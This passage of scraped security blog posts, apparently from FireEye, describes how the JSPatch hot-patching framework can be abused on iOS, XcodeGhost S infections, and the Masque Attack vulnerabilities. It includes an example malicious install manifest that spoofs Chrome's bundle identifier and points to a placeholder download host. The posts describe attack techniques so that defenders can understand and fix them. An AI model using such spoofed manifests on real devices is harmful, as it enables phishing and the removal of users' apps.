                "text": "Introduction Apple has made a significant effort to build and maintain a healthy and clean app ecosystem. The essential contributing component to this status quo is the App Store, which is protected by a thorough vetting process that scrutinizes all submitted applications. While the process is intended to protect iOS users and ensure apps meet Apple’s standards for security and integrity, developers who have experienced the process would agree that it can be difficult and time consuming. The same process then must be followed when publishing a new release or issuing a patched version of an existing app, which can be extremely frustrating when a developer wants to patch a severe bug or security vulnerability impacting existing app users. The developer community has been searching for alternatives, and with some success. A set of solutions now offer a more efficient iOS app deployment experience, giving app developers the ability to update their code as they see fit and deploy patches to users’ devices immediately. While these technologies provide a more autonomous development experience, they do not meet the same security standards that Apple has attempted to maintain. Worse, these methods might be the Achilles heel to the walled garden of Apple’s App Store. In this series of articles, FireEye mobile security researchers examine the security risks of iOS apps that employ these alternate solutions for hot patching, and seek to prevent unintended security compromises in the iOS app ecosystem. As the first installment of this series, we look into an open source solution: JSPatch . Episode 1. JSPatch JSPatch is an open source project – built on top of Apple’s JavaScriptCore framework – with the goal of providing an alternative to Apple’s arduous and unpredictable review process in situations where the timely delivery of hot fixes for severe bugs is vital. In the author’s own words ( bold added for emphasis): JSPatch bridges Objective-C and JavaScript using the Objective-C runtime. You can call any Objective-C class and method in JavaScript by just including a small engine. That makes the APP obtaining the power of script language: add modules or replacing Objective-C code to fix bugs dynamically . JSPatch Machinery The JSPatch author, using the alias Bang, provided a common example of how JSPatch can be used to update a faulty iOS app on his blog: Figure 1 shows an Objc implementation of a UITableViewController with class name JPTableViewController that provides data population via the selector tableView:didSelectRowAtIndexPath: . At line 5, it retrieves data from the backend source represented by an array of strings with an index mapping to the selected row number. In many cases, this functions fine; however, when the row index exceeds the range of the data source array, which can easily happen, the program will throw an exception and subsequently cause the app to crash. Crashing an app is never an appealing experience for users. Figure 1. Buggy Objc code without JSPatch Within the realm of Apple-provided technologies, the way to remediate this situation is to rebuild the application with updated code to fix the bug and submit the newly built app to the App Store for approval. While the review process for updated apps often takes less time than the initial submission review, the process can still be time-consuming, unpredictable, and can potentially cause loss of business if app fixes are not delivered in a timely and controlled manner. However, if the original app is embedded with the JSPatch engine, its behavior can be changed according to the JavaScript code loaded at runtime. This JavaScript file ( hxxp://cnbang.net/bugfix.JS in the above example) is remotely controlled by the app developer. It is delivered to the app through network communication. Figure 2 shows the standard way of setting up JSPatch in an iOS app. This code would allow download and execution of a JavaScript patch when the app starts: Figure 2. Objc code enabling JSPatch in an app JSPatch is indeed lightweight. In this case, the only additional work to enable it is to add seven lines of code to the application:didFiishLaunchingWithOptions: selector. Figure 3 shows the JavaScript downloaded from hxxp://cnbang.net/bugfix.JS that is used to patch the faulty code. Figure 3. JSPatch hot patch fixing index out of bound bug in Figure 1 Malicious Capability Showcase JSPatch is a boon to iOS developers. In the right hands, it can be used to quickly and effectively deploy patches and code updates. But in a non-utopian world like ours, we need to assume that bad actors will leverage this technology for unintended purposes. Specifically, if an attacker is able to tamper with the content of JavaScript file that is eventually loaded by the app, a range of attacks can be successfully performed against an App Store application. Target App We randomly picked a legitimate app [1] with JSPatch enabled from the App Store. The logistics of setting up the JSPatch platform and resources for code patching are packaged in this routine [AppDelegate excuteJSPatch:] , as shown in Figure 4 [2] : Figure 4. JSPatch setup in the targeted app There is a sequence of flow from the app entry point (in this case the AppDelegate class) to where the JavaScript file containing updates or patch code is written to the file system. This process involves communicating with the remote server to retrieve the patch code. On our test device, we eventually found that the JavaScript patch code is hashed and stored at the location shown in Figure 5. The corresponding content is shown in Figure 6 in Base64-encoded format: Figure 5. Location of downloaded JavaScript on test device Figure 6. Encrypted patch content While the target app developer has taken steps to secure this sensitive data from prying eyes by employing Base64 encoding on top of a symmetric encryption, one can easily render this attempt futile by running a few commands through Cycript . The patch code, once decrypted, is shown in Figure 7: Figure 7. Decrypted original patch content retrieved from remote server This is the content that gets loaded and executed by JPEngine, the component provided by the JSPatch framework embedded in the target app. To change the behavior of the running app, one simply needs to modify the content of this JavaScript blob. Below we show several possibilities for performing malicious actions that are against Apple’s App Review Guidelines . Although the examples below are from a jailbroken device, we have demonstrated that they will work on non-jailbroken devices as well. Example 1: Load arbitrary public frameworks into app process a .     Example public framework : /System/Library/Frameworks/Accounts.framework b .     Private APIs used by public framework: [ACAccountStore init] , [ACAccountStore allAccountTypes] The target app discussed above, when running, loads the frameworks shown in Figure 8 into its process memory: Figure 8. iOS frameworks loaded by the target app Note that the list above – generated from the Apple-approved iOS app binary – does not contain Accounts.framework . Therefore, any “dangerous” or “risky” operations that rely on the APIs provided by this framework are not expected to take place. However, the JavaScript code shown in Figure 9 invalidates that assumption. Figure 9. JavaScript patch code that loads the Accounts.framework into the app process If this JavaScript code were delivered to the target app as a hot patch, it could dynamically load a public framework, Accounts.framework , into the running process. Once the framework is loaded, the script has full access to all of the framework’s APIs. Figure 10 shows the outcome of executing the private API [ACAccountStore allAccountTypes], which outputs 36 account types on the test device . This added behavior does not require the app to be rebuilt, nor does it require another review through the App Store. Figure 10. The screenshot of the console log for utilizing Accounts.framework The above demonstration highlights a serious security risk for iOS app users and app developers. The JSPatch technology potentially allows an individual to effectively circumvent the protection imposed by the App Store review process and perform arbitrary and powerful actions on the device without consent from the users. The dynamic nature of the code makes it extremely difficult to catch a malicious actor in action. We are not providing any meaningful exploit in this blog post, but instead only pointing out the possibilities to avoid low-skilled attackers taking advantage of off-the-shelf exploits. Example 2: Load arbitrary private frameworks into app process a. Example private framework: /System/Library/PrivateFrameworks/BluetoothManager.framework b. Private APIs used by example framework: [ BluetoothManager connectedDevices] , [BluetoothDevice name] Similar to the previous example, a malicious JSPatch JavaScript could instruct an app to load an arbitrary private framework, such as the BluetoothManager.framework , and further invoke private APIs to change the state of the device. iOS private frameworks are intended to be used solely by Apple-provided apps. While there is no official public documentation regarding the usage of private frameworks, it is common knowledge that many of them provide private access to low-level system functionalities that may allow an app to circumvent security controls put in place by the OS. The App Store has a strict policy prohibiting third party apps from using any private frameworks. However, it is worth pointing out that the operating system does not differentiate Apple apps’ private framework usage and a third party app’s private framework usage. It is simply the App Store policy that bans third party use. With JSPatch, this restriction has no effect because the JavaScript file is not subject to the App Store’s vetting. Figure 11 shows the code for loading the BluetoothManager.framework and utilizing APIs to read and change the states of Bluetooth of the host device. Figure 12 shows the corresponding console outputs. Figure 11. JavaScript patch code that loads the BluetoothManager.framework into the app process Figure 12. The screenshot of the console log for utilizing BluetoothManager.framework Example 3: Change system properties via private API a .     Example dependent framework: b /System/Library/Frameworks/CoreTelephony.framework b . Private API used by example framework: [CTTelephonyNetworkInfo updateRadioAccessTechnology:] Consider a target app that is built with the public framework CoreTelephony.framework . Apple documentation explains that this framework allows one to obtain information about a user’s home cellular service provider. It exposes several public APIs to developers to achieve this, but [CTTelephonyNetworkInfo updateRadioAccessTechnology:] is not one of them. However, as shown in Figure 13 and Figure 14, we can successfully use this private API to update the device cellular service status by changing the radio technology from CTRadioAccessTechnologyHSDPA to CTRadioAccessTechnologyLTE without Apple’s consent. Figure 13. JavaScript code that changes the Radio Access Technology of the test device Figure 14. Corresponding execution output of the above JavaScript code via Private API Example 4: Access to Photo Album (sensitive data) via public APIs a .     Example loaded framework: /System/Library/Frameworks/Photos.framework b .     Public APIs : [PHAsset fetchAssetsWithMediaType:options:] Privacy violations are a major concern for mobile users. Any actions performed on a device that involve accessing and using sensitive user data (including contacts, text messages, photos, videos, notes, call logs, and so on) should be justified within the context of the service provided by the app. However, Figure 15 and Figure 16 show how we can access the user’s photo album by leveraging the private APIs from built-in Photo.framework to harvest the metadata of photos. With a bit more code, one can export this image data to a remote location without the user’s knowledge. Figure 15. JavaScript code that access the Photo Library Figure 16. Corresponding output of the above JavaScript in Figure 15 Example 5: Access to Pasteboard in real time a .     Example Framework: /System/Library/Frameworks/UIKit.framework b .     APIs: [UIPasteboard strings], [UIPasteboard items], [UIPasteboard string] iOS pasteboard is one of the mechanisms that allows a user to transfer data between apps. Some security researchers have raised concerns regarding its security , since pasteboard can be used to transfer sensitive data such as accounts and credentials. Figure 17 shows a simple demo function in JavaScript that, when running on the JSPatch framework, scrapes all the string contents off the pasteboard and displays them on the console. Figure 18 shows the output when this function is injected into the target application on a device. Figure 17. JavaScript code that scraps the pasteboard which might contain sensitive information Figure 18. Console output of the scraped content from pasteboard by code in Figure 17 We have shown five examples utilizing JSPatch as an attack vector, and the potential for more is only constrained by an attacker’s imagination and creativity. Future Attacks Much of iOS’ native capability is dependent on C functions (for example, dlopen() , UIGetImageScreen() ). Due to the fact that C functions cannot be reflectively invoked, JSPatch does not support direct Objective C to JavaScript mapping. In order to use C functions in JavaScript, an app must implement JSExtension, which packs the C function into corresponding interfaces that are further exported to JavaScript. This dependency on additional Objective C code to expose C functions casts limitations on the ability of a malicious actor to perform operations such as taking stealth screenshots, sending and intercepting text messages without consent, stealing photos from the gallery, or stealthily recording audio. But these limitations can be easily lifted should an app developer choose to add a bit more Objective C code to wrap and expose these C functions. In fact, the JSPatch author could offer such support to app developers in the near future through more usable and convenient interfaces, granted there is enough demand. In this case, all of the above operations could become reality without Apple’s consent. Security Impact It is a general belief that iOS devices are more secure than mobile devices running other operating systems; however, one has to bear in mind that the elements contributing to this status quo are multi-faceted. The core of Apple’s security controls to provide and maintain a secure ecosystem for iOS users and developers is their walled garden – the App Store. Apps distributed through the App Store are significantly more difficult to leverage in meaningful attacks. To this day, two main attack vectors make up all previously disclosed attacks against the iOS platform: 1.     Jailbroken iOS devices that allow unsigned or ill-signed apps to be installed due to the disabled signature checking function. In some cases, the sandbox restrictions are lifted, which allows apps to function outside of the sandbox. 2.     App sideloading via Enterprise Certifications on non-jailbroken devices. FireEye published a series of reports that detailed attacks exploiting this attack surface, and recent reports show a continued focus on this known attack vector. However, as we have highlighted in this report, JSPatch offers an attack vector that does not require sideloading or a jailbroken device for an attack to succeed. It is not difficult to identify that the JavaScript content, which is not subject to any review process, is a potential Achilles heel in this app development architecture. Since there are few to zero security measures to ensure the security properties of this file, the following scenarios for attacking the app and the user are conceivable: ● Precondition : 1) App embeds JSPatch platform; 2) App Developer has malicious intentions. ○ Consequences : The app developer can utilize all the Private APIs provided by the loaded frameworks to perform actions that are not advertised to Apple or the users. Since the developer has control of the JavaScript code, the malicious behavior can be temporary, dynamic, stealthy, and evasive. Such an attack, when in place, will pose a big risk to all stakeholders involved. ○      Figure 19 demonstrates a scenario of this type of attack: Figure 19. Threat model for JSPatch used by a malicious app developer ● Precondition : 1) Third-party ad SDK embeds JSPatch platform; 2) Host app uses the ad SDK; 3) Ad SDK provider has malicious intention against the host app. ○ Consequences : 1) Ad SDK can exfiltrate data from the app sandbox; 2) Ad SDK can change the behavior of the host app; 3) Ad SDK can perform actions on behalf of the host app against the OS. ○      This attack scenario is shown in Figure 20: Figure 20. Threat model for JSPatch used by a third-party library provider The FireEye discovery of iBackdoor in 2015 is an alarming example of displaced trust within the iOS development community, and serves as a sneak peek into this type of overlooked threat. ● Precondition : 1) App embeds JSPatch platform; 2) App Developer is legitimate; 3) App does not protect the communication from the client to the server for JavaScript content; 4) A malicious actor performs a man-in-the-middle (MITM) attack that tampers with the JavaScript content. ○ Consequences : MITM can exfiltrate app contents within the sandbox; MITM can perform actions through Private API by leveraging host app as a proxy. ○      This attack scenario is shown in Figure 21: Figure 21. Threat model for JSPatch used by an app targeted by MITM Field Survey JSPatch originated from China. Since its release in 2015, it has garnered success within the Chinese region. According to JSPatch, many popular and high profile Chinese apps have adopted this technology. FireEye app scanning found a total 1,220 apps in the App Store that utilize JSPatch. We also found that developers outside of China have adopted this framework. On one hand, this indicates that JSPatch is a useful and desirable technology in the iOS development world. On the other hand, it signals that users are at greater risk of being attacked – particularly if precautions are not taken to ensure the security of all parties involved. Despite the risks posed by JSPatch, FireEye has not identified any of the aforementioned applications as being malicious. Food For Thought Many applaud Apple’s App Store for helping to keep iOS malware at bay. While it is undeniably true that the App Store plays a critical role in winning this acclaim, it is at the cost of app developers’ time and resources. One of the manifestations of such a cost is the app hot patching process, where a simple bug fix has to go through an app review process that subjects the developers to an average waiting time of seven days before updated code is approved. Thus, it is not surprising to see developers seeking various solutions that attempt to bypass this wait period, but which lead to unintended security risks that may catch Apple off guard. JSPatch is one of several different offerings that provide a low-cost and streamlined patching process for iOS developers. All of these offerings expose a similar attack vector that allows patching scripts to alter the app behavior at runtime, without the constraints imposed by the App Store’s vetting process. Our demonstration of abusing JSPatch capabilities for malicious gain, as well as our presentation of different attack scenarios, highlights an urgent problem and an imperative need for a better solution – notably due to a growing number of app developers in China and beyond having adopted JSPatch. Many developers have doubts that the App Store would accept technologies leveraging scripts such as JavaScript. According to Apple’s App Store Review Guidelines, apps that download code in any way or form will be rejected. However, t he JSPatch community argues it is in compliance with Apple’s iOS Developer Program Information, which makes an exception to scripts and code downloaded and run by Apple's built-in WebKit framework or JavascriptCore, provided that such scripts and code do not change the primary purpose of the application by providing features or functionality that are inconsistent with the intended and advertised purpose of the application as submitted to the App Store. The use of malicious JavaScript (which presumably changes the primary purpose of the application) is clearly prohibited by the App Store policy. JSPatch is walking a fine line, but it is not alone. In our coming reports, we intend to similarly examine more solutions in order to find a better solution that satisfies Apple and the developer community without jeopardizing the users security experience. Stay tuned! [1] We have contacted the app provider regarding the issue. In order to protect the app vendor and its users, we choose to not disclose the identity before they have this issue addressed. [2] The redacted part is the hardcoded decryption key. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2015/11/xcodeghost_s_a_new.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2015-11-03",
                    "source": "www.fireeye.com"
                },
                "text": "Just over a month ago, iOS users were warned of the threat to their devices by the XcodeGhost malware. Apple quickly reacted, taking down infected apps from the App Store and releasing new security features to stop malicious activities. Through continuous monitoring of our customers’ networks, FireEye researchers have found that, despite the quick response, the threat of XcodeGhost has maintained persistence and been modified. More specifically, we found that: XcodeGhost has entered into U.S. enterprises and is a persistent security risk Its botnet is still partially active A variant we call XcodeGhost S reveals more advanced samples went undetected After monitoring XcodeGhost related activity for four weeks, we observed 210 enterprises with XcodeGhost-infected applications running inside their networks, generating more than 28,000 attempts to connect to the XcodeGhost Command and Control (CnC) servers -- which, while not under attacker control, are vulnerable to hijacking by threat actors. Figure 1 shows the top five countries XcodeGhost attempted to callback to during this time. Figure 1. Top five countries XcodeGhost attempted to callback in a four-week span The 210 enterprises we detected with XcodeGhost infections represent a wide range of industries. Figure 2 shows the top five industries affected by XcodeGhost, sorted by the percentage of callback attempts to the XcodeGhost CnC servers from inside their networks: Figure 2: Top five industries affected based on callback attempts Researchers have demonstrated how XcodeGhost CnC traffic can be hijacked to: Distribute apps outside the App Store Force browse to URL Aggressively promote any app in the App Store by launching the download page directly Pop-up phishing windows Figure 3 shows the top 20 most active infected apps among 152 apps, based on data from our DTI cloud: Figure 3: Top 20 infected apps Although most vendors have already updated their apps on App Store, this chart indicates many users are actively using older, infected versions of various apps in the field. The version distribution varies among apps. For example, the most popular Apps 网易云音乐 and WeChat-infected versions are listed in Figure 4. App Name Version Incident Count (in 3 weeks) WeChat 6.2.5.19 2963 网易云音乐 Music 163 2.8.2 3084 2.8.3 2664 2.8.1 1227 Figure 4: Sample infected app versions The infected iPhones are running iOS versions from 6.x.x to 9.x.x as illustrated by Figure 5. It is interesting to note that nearly 70% of the victims within our customer base remain on older iOS versions. We encourage them to update to the latest version iOS 9 as quickly as possible. Figure 5: Distribution of iOS versions running infected apps Some enterprises have taken steps to block the XcodeGhost DNS query within their network to cut off the communication between employees’ iPhones and the attackers’ CnC servers to protect them from being hijacked. However, until these employees update their devices and apps, they are still vulnerable to potential hijacking of the XcodeGhost CnC traffic -- particularly when outside their corporate networks. Given the number of infected devices detected within a short period among so many U.S enterprises, we believe that XcodeGhost continues to be an ongoing threat for enterprises. XcodeGhost Modified to Exploit iOS 9 We have worked with Apple to have all XcodeGhost and XcodeGhost S (described below) samples we have detected removed from the App Store. XcodeGhost is planted in different versions of Xcode, including Xcode 7 (released for iOS 9 development). In the latest version, which we call XcodeGhost S, features have been added to infect iOS 9 and bypass static detection. According to [1], Apple introduced the “NSAppTransportSecurity” approach for iOS 9 to improve client-server connection security. By default, only secure connections (https with specific ciphers) are allowed on iOS 9. Due to this limitation, previous versions of XcodeGhost would fail to connect with the CnC server by using http. However, Apple also allows developers to add exceptions (“NSAllowsArbitraryLoads”) in the app’s Info.plist to allow http connection. As shown in Figure 6, the XcodeGhost S sample reads the setting of “NSAllowsArbitraryLoads” under the “NSAppTransportSecurity” entry in the app’s Info.plist and picks different CnC servers (http/https) based on this setting. Figure 6: iOS 9 adoption in XcodeGhost S Further, the CnC domain strings are concatenated character by character to bypass the static detection in XcodeGhost S, such behavior is shown in Figure 7. Figure 7: Construct the CnC domain character by character The FireEye iOS dynamic analysis platform has successfully detected an app  (“自由邦”)  [2] infected by XcodeGhost S and this app has been taken down from App Store in cooperation with Apple. It is a shopping app for travellers and is available on both U.S. and CN App Stores. As shown in Figure 8, the infected app’s version is 2.6.6, updated on Sep. 15. Figure 8: An App Store app is infected with XcodeGhost S Enterprise Protection FireEye MTP has detected and assisted in Apple’s takedown of thousands of XcodeGhost-infected iOS applications. We advise all organizations to notify their employees of the threat of XcodeGhost and other malicious iOS apps. Employees should make sure that they update all apps to the latest version. For the apps Apple has removed, users should remove the apps and switch to other uninfected apps on App Store. FireEye MTP management customers have full visibility into which mobile devices are infected in their deployment base. We recommend that customers immediately review MTP alerts, locate infected devices/users, and quarantine the devices until the infected apps are removed. FireEye NX customers are advised to immediately review alert logs for activities related to XcodeGhost communications. [1] h ttps://developer.apple.com/library/prerelease/ios/technotes/App-Transport-Security-Technote/ [2] https://itunes.apple.com/us/app/id915233927 [3] http://drops.wooyun.org/papers/9024 [4] https://itunes.apple.com/us/app/pdf-reader-annotate-scan-sign/id368377690?mt=8 [5] https://itunes.apple.com/us/app/winzip-leading-zip-unzip-cloud/id500637987?mt=8 [7] https://www.fireeye.com/blog/threat-research/2015/08/ios_masque_attackwe.html [8] https://www.fireeye.com/blog/threat-research/2015/02/ios_masque_attackre.html [9] https://www.fireeye.com/blog/threat-research/2014/11/masque-attack-all-your-ios-apps-belong-to-us.html [10] https://www.fireeye.com/blog/threat-research/2015/06/three_new_masqueatt.html Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2015/06/three_new_masqueatt.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2015-06-30",
                    "source": "www.fireeye.com"
                },
                "text": "In the recent release of iOS 8.4, Apple fixed several vulnerabilities including vulnerabilities that allow attackers to deploy two new kinds of Masque Attack (CVE-2015-3722/3725, and CVE-2015-3725). We call these exploits Manifest Masque and Extension Masque, which can be used to demolish apps, including system apps (e.g., Apple Watch, Health, Pay and so on), and to break the app data container. In this blog, we also disclose the details of a previously fixed, but undisclosed, masque vulnerability: Plugin Masque, which bypasses iOS entitlement enforcement and hijacks VPN traffic. Our investigation also shows that around one third of iOS devices still have not updated to versions 8.1.3 or above, even 5 months after the release of 8.1.3, and these devices are still vulnerable to all the Masque Attacks. We have disclosed five kinds of Masque Attacks, as shown in the following table. Name Consequences disclosed till now Mitigation status App Masque * Replace an existing app * Harvest sensitive data Fixed in iOS 8.1.3 [6] URL Masque * Bypass prompt of trust * Hijack inter-app communication Partially fixed in iOS 8.1.3 [11] Manifest Masque * Demolish other apps (incl. Apple Watch, Health, Pay, etc.) during over-the-air installations Partially fixed in iOS 8.4 Plugin Masque * Bypass prompt of trust * Bypass VPN plugin entitlement * Replace an existing VPN plugin * Hijack device traffic * Prevent device from rebooting * Exploit more kernel vulnerabilities Fixed in iOS 8.1.3 Extension Masque * Access another app’s data * Or prevent another app to access its own data Partially fixed in iOS 8.4 Manifest Masque Attack leverages the CVE-2015-3722/3725 vulnerability to demolish an existing app on iOS when a victim installs an in-house iOS app wirelessly using enterprise provisioning from a website. The demolished app (the attack target) can be either a regular app downloaded from official App Store or even an important system app, such as Apple Watch, Apple Pay, App Store, Safari, Settings, etc. This vulnerability affects all iOS 7.x and iOS 8.x versions prior to iOS 8.4. We first notified Apple of this vulnerability in August 2014. Extension Masque Attack can break the restrictions of app data container. A malicious app extension installed along with an in-house app on iOS 8 can either gain full access to a targeted app’s data container or prevent the targeted app from accessing its own data container. On June 14, security researchers Luyi, Xiaofeng et al. disclosed several severe issues on OS X, including a similar issue with this one [5]. They did remarkable research, but happened to miss this on iOS. Their report claimed: “this security risk is not present on iOS ”. However, the data container issue does affect all iOS 8.x versions prior to iOS 8.4, and can be leveraged by an attacker to steal all data in a target app’s data container. We independently discovered this vulnerability on iOS and notified Apple before the report [5] was published, and Apple fixed this issue as part of CVE-2015-3725. In addition to these two vulnerabilities patched on iOS 8.4, we also disclose the detail of another untrusted code injection attack by replacing the VPN Plugin, the Plugin Masque Attack. We reported this vulnerability to Apple in Nov 2014, and Apple fixed the vulnerability on iOS 8.1.3 when Apple patched the original Masque Attack (App Masque) [6, 11]. However, this exploit is even more severe than the original Masque Attack. The malicious code can be injected to the neagent process and can perform privileged operations, such as monitoring all VPN traffic, without the user’s awareness. We first demonstrated this attack in the Jailbreak Security Summit [7] in April 2015. Here we categorize this attack as Plugin Masque Attack. We will discuss the technical details and demonstrate these three kinds of Masque Attacks. Manifest Masque: Putting On the New, Taking Off the Old To distribute an in-house iOS app with enterprise provisioning wirelessly, one has to publish a web page containing a hyperlink that redirects to a XML manifest file hosted on an https server [1]. The XML manifest file contains metadata of the in-house app, including its bundle identifier, bundle version and the download URL of the .ipa file, as shown in Table 1. When installing the in-house iOS app wirelessly, iOS downloads this manifest file first and parse the metadata for the installation process. <a href=\"itms-services://?action=downloadmanifest&url=https://example.com/manifest. plist\">Install App</a> <plist> <array> <dict> ... <key>url</key> <string>https://XXXXX.com/another_browser.ipa</string> ... <key>bundle-identifier</key> <string>com.google.chrome.ios</string> … <key>bundle-version</key> <string>1000.0</string> </dict> <dict> … Entries For Another App </dict> <array> </plist> Table 1. An example of the hyperlink and the manifest file According to Apple’s official document [1], the bundle-identifier field should be “Your app’s bundle identifier, exactly as specified in your Xcode project”. However, we have discovered that iOS doesn’t verify the consistency between the bundle identifier in the XML manifest file on the website and the bundle identifier within the app itself. If the XML manifest file on the website has a bundle identifier equivalent to that of another genuine app on the device, and the bundle-version in the manifest is higher than the genuine app’s version, the genuine app will be demolished down to a dummy placeholder, whereas the in-house app will still be installed using its built-in bundle id. The dummy placeholder will disappear after the victim restarts the device. Also, as shown in Table 1, a manifest file can contain different apps’ metadata entries to distribute multiple apps at a time, which means this vulnerability can cause multiple apps being demolished with just one click by the victim. By leveraging this vulnerability, one app developer can install his/her own app and demolish other apps (e.g. a competitor’s app) at the same time. In this way, attackers can perform DoS attacks or phishing attacks on iOS. Figure 1. Phishing Attack by installing “malicious Chrome” and demolishing the genuine one Figure 1 shows an example of the phishing attack. When the user clicks a URL in the Gmail app, this URL is rewritten with the “googlechrome-x-callback://” scheme and supposed to be handled by Chrome on the device. However, an attacker can leverage the Manifest Masque vulnerability to demolish the genuine Chrome and install “malicious Chrome” registering the same scheme. Other than requiring the same bundle identifier to replace a genuine app in the original Masque Attack [xx], the malicious chrome in this phishing attack uses a different bundle identifier to bypass the installer’s bundle identifier validation. Later, when the victim clicks a URL in the Gmail app, the malicious Chrome can take over the rewritten URL scheme and perform more sophisticated attacks. What’s worse, an attacker can also exploit this vulnerability to demolish all system apps (e.g. Apple Watch, Apple Pay UIService, App Store, Safari, Health, InCallService, Settings, etc.). Once demolished, these system apps will no longer be available to the victim, even if the victim restarts the device. Here we demonstrate this DoS attack on iOS 8.3 to demolish all the system apps and one App Store app (i.e. Gmail) when the victim clicks only once to install an in-house app wirelessly. Note that after rebooting the device, all the system apps still remain demolished while the App Store app would disappear since it has already been uninstalled. Extension Masque: Breaking The Data Container Apple introduces the app extension feature [2] on iOS 8. Different\ntypes of the app extension provide various new ways for the developer\nto extend the app’s functionality on iOS 8. For example, the app can\nappear as a widget on the Today screen, add new buttons in the Action\nsheet, offer photo filters within the iOS Photos app, or display a new\nsystem-wide custom keyboard [3]. In addition, the watch extension [4]\non iPhone delegates all logic of a watch app on iOS 8.2/8.3 after the\nrelease of Apple Watch. An app extension can execute code and is\nrestricted to access data within its data container. Extensions are\ndistributed as a part of the iOS app, which can be leveraged as\npotential new attack vectors by attackers. We independently discovered that the extension within an iOS 8 app\ncould either gain full access to other apps’ data containers or\nprevent other apps from accessing their own data containers, as long\nas the extension uses the same bundle identifier as the target app. An\nattacker can lure a victim to install an in-house app using enterprise\nprovisioning from a website and to enable the malicious extension of\nthe in-house app on his/her device. The effect of such attack is related to the installation sequence of\nthe malicious extension and the target app. Note that an extension\ncannot be installed standalone; it must be distributed as a part of an\napp. So in the following content when we refer to installing an\nextension we mean installing an app carrying that extension. If installed before the target app, the malicious\nextension can break the data container and gain full access to the\ntarget app's data container without users’ awareness, while the\ntarget app would work normally. If the malicious extension\nis installed after the target app, the target app can no\nlonger access its own data container. Thus the functionality of the\ntarget app will be seriously disturbed and the app will even crash\n(causing denial-of-service). In this circumstance, if the victim\ntries to reinstall the target app, the target app would recover. But\nthis falls into the prior case again -- the victim app is now\ninstalled after the malicious app, so the malicious extension\ncan gain full access to the target app's container. Here is a demo for breaking the data container attack. In this demo,\na malicious extension can access all the files within the Gmail app’s\ndata container and upload them to the attacker’s server. Plugin Masque: Executing Untrusted Code with Privilege Apart of the iOS extension, the VPN plugin is another type of bundle\nin an .ipa file. Compared to iOS extension that can be embedded in any\niOS 8 app without any special entitlement, both the VPN app and the\nVPN plugin need to be provisioned with the\n“com.apple.networking.vpn.configuration” entitlement to provide\nsystem-wide VPN service. So far only in a few exclusive iOS developers\ncan distribute such VPN client (e.g. Cisco Anyconnect, Junos Pulse,\nOpenVPN etc.) on iOS. After installation, the VPN plugin is loaded\nwithout any user interface by a privileged system process, neagent [8]. Figure 2 shows the directory structure of the Junos Pulse .ipa\nfile, the VPN plugin (SSLVPNJuniper.vpnplugin) locates in the Payload\ndirectory, along with the ordinary app (Junos Pulse.app) providing the\nuser interface to configure the VPN. Figure 2. Directory Layout of the Junos Pulse App We discovered that if an in-house app embeds a malicious VPN Plugin\nthat has the same bundle id as the legitimate VPN Plugin on the\nvictim’s iOS, the malicious VPN Plugin can be successfully installed\nand replace the legitimate one without any special entitlement\n(e.g. “com.apple.networking.vpn.configuration”).  Later, when the\nvictim launches the ordinary VPN app to access the VPN service, the\nuntrusted code in the malicious VPN Plugin will be loaded by the neagent process and perform privileged operation, such as\nhijacking/monitoring all the VPN traffic. Injecting code to the neagent process to escape the sandbox is also a critical\nexploit used in the PanGu 8 [8, 12] jailbreak tool. By leveraging the\nVPN plugin vulnerability, it is possible to jailbreak an iOS device\nwith 8.1.2 or before over-the-air directly with other kernel\nexploits.This vulnerability is related to CVE-2014-4493 and was\npatched in iOS 8.1.3. We first disclose and demonstrate this attack in\nthe Jailbreak Security Summit [7] in April 2015. This vulnerability is related to CVE-2014-4493 and was patched in\niOS 8.1.3. We first disclosed and demonstrated this attack in the\nJailbreak Security Summit [7] in April 2015. Here is a demo for the untrusted code execution attack. In this\ndemo, the in-house app containing a malicious VPN plugin is installed\non victim’s device. After the user configures VPN use the original\nJunos Pulse app, the PoC code of the malicious VPN plugin is loaded\nand executed by neagent . while(1) { syslog(LOG_ERR, \"[+] ========= ****** PoC DYLIB LOADED\n****** ==========\"); sleep(3); } Table 2. PoC code of the malicious VPN Plugin Note that successfully launching this attack doesn’t require the\nuser to touch/trust the in-house app. Even if the user force\nuninstalling the VPN app being attacked, the app will come back again\nafter reboot. That means the user can't uninstall the app easily. Even\nif the user tries to power off the phone by long-pressing the power\nbutton, the neagent daemon running attacker's code will be keep\nrunning in the background and stops the device from a real reboot. The\nphone screen will be totally black and looks like the device is\nrebooting, however, neagent can keep running with the\nattacker's code in the background. iOS Update Gap in Enterprise Networks The release of iOS 8.1.3 (where App Masque, URL Masque, and Plugin\nMasque issues were fixed or partially fixed) was in January 2015, and\niOS is well known for its fast adoption of new versions. However, our\nrecent monitoring of iOS web traffic in several high-profile networks\nshows surprising results. As shown in Figure 3, nearly one third of\nthe iOS traffic that we monitored is still from devices with versions\nbelow 8.1.3 even 5 months after its release. The devices behind that\ntraffic are still vulnerable to all the Masque Attacks, including the\nApp Masque, URL Masque, and Plugin Masque. We urge everyone,\nespecially enterprise users, to keep up with the latest iOS updates. Figure 3. iOS version ratios based on network traffic monitored by FireEye Conclusions To summarize, although Apple has fixed or partially fixed the\noriginal Masque Attack [6, 11] on iOS 8.1.3, there are still other\nattack surfaces to exploit vulnerabilities in the installation process\non iOS. We disclose the details of three variants of Masque Attack in\nthis article to help users realize the risk and better protect\nthemselves. Moreover, around one third of iOS devices that we\nmonitored are still vulnerable to all the Masque Attacks because they\nhave not been upgraded. We suggest that all iOS users keep their\ndevices up-to-date. [2] https://developer.apple.com/app-extensions/ [3] https://developer.apple.com/library/prerelease/ios/documentation/General/Conceptual/ExtensibilityPG/NotificationCenter.html [4] https://developer.apple.com/library/ios/documentation/General/Conceptual/WatchKitProgrammingGuide/DesigningaWatchKitApp.html [5] https://drive.google.com/file/d/0BxxXk1d3yyuZOFlsdkNMSGswSGs/view [6] https://www.fireeye.com/blog/threat-research/2014/11/masque-attack-all-your-ios-apps-belong-to-us.html [7] http://thecyberwire.com/events/docs/nsmail.pdf [8] https://cansecwest.com/slides/2015/CanSecWest2015_Final.pdf [9] https://itunes.apple.com/us/app/cisco-anyconnect/id392790924?mt=8 [11] https://www.fireeye.com/blog/threat-research/2015/02/ios_masque_attackre.html [12] http://en.pangu.io/ Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
